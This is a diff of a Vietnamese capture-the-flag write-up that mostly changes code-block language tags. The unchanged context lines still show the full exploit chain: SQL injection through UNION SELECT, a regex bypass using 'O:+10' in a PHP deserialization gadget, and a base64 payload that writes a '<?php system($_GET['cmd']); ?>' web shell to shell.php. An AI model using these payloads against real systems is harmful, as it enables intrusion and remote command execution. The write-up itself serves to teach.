@@ -150,7 +150,7 @@ Và mình nghi ngờ rằng web này sẽ có lỗ hỏng ```PHP Deserialized```
 ##### Model
 **CanteenModel.php**
 
-```PHP
+```php
 <?php
 class CanteenModel {
 
@@ -225,7 +225,7 @@ class CanteenModel {
 
 Sau khi phân tích thì mình thấy hàm ```filterFood($price_param)``` trong CanteenModel thực hiện nối chuỗi trực tiếp:
 
-```text
+```php
 $sql = "SELECT * FROM food where price < " . $price_param;
 ```
 
@@ -233,14 +233,14 @@ Cho phép chúng ta sử dụng ```UNION SELECT``` để điều khiển dữ li
 
 Ngoài ra dữ liệu từ cột ```oldvalue``` sẽ đi thẳng vào:
 
-```text
+```php
 $uns_result = unserialize($dec_result);
 ```
 => Confirm lỗ hỏng là ```PHP Deserialization``` và ```SQL Injection```.
 
 Mặc dù đã có 1 lớp Regex chặn các đối tượng khởi đầu bằng ```O:\d+```:
 
-```text
+```php
 if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
       return 'Not allowed';
 }
@@ -249,7 +249,7 @@ nhưng chúng ta có thể bypass bằng cách thêm dấu ```+``` vào độ d�
 
 **AdminModel.php**
 
-```PHP
+```php
 <?php
 
 if($_SESSION["admin"] === false){
@@ -286,7 +286,7 @@ class LogFile {
 
 Nhìn vào đây mình thấy được ở hàm ```__construct($filename, $content)``` thì mình thấy lệnh sau:
 
-```text
+```php
 file_put_contents($filename, $content, FILE_APPEND);
 ```
 
@@ -317,7 +317,7 @@ Sau khi phân tích source code đã đời thì mình sẽ thực hiện tấn 
 #### Payload
 Đầu tiên mình xây dựng 1 chuỗi PHP đã được serialize như sau:
 
-```text
+```php
 a:3:{i:0;s:7:"SKIBIDI";i:1;s:1:"1";i:2;O:+10:"AdminModel":2:{s:8:"filename";s:9:"shell.php";s:10:"logcontent";s:30:"<?php system($_GET['cmd']); ?>";}}
 ```
 
@@ -329,7 +329,7 @@ YTozOntpOjA7czo3OiJTS0lCSURJIjtpOjE7czoxOiIxIjtpOjI7TzorMTA6IkFkbWluTW9kZWwiOjI6
 
 Rồi mình xây dựng 1 payload SQL sử dụng ```UNION SELECT```:
 
-```text
+```sql
 -1 UNION SELECT 1, 'test', 'YTozOntpOjA7czo3OiJTS0lCSURJIjtpOjE7czoxOiIxIjtpOjI7TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6OToic2hlbGwucGhwIjtzOjEwOiJsb2djb250ZW50IjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO319', 4-- -
 ```
 
@@ -383,6 +383,7 @@ Magic method cũng là con dao 2 lưỡi (```__wakeup()```, ```__destruct()```),
 
 ### Lời kết
 Thôi thì bài writeup của mình cũng chỉ đến đây thôi =))) Chúc các bạn 1 ngày vui vẻ, mình ngủ đây.
+
 
 
 
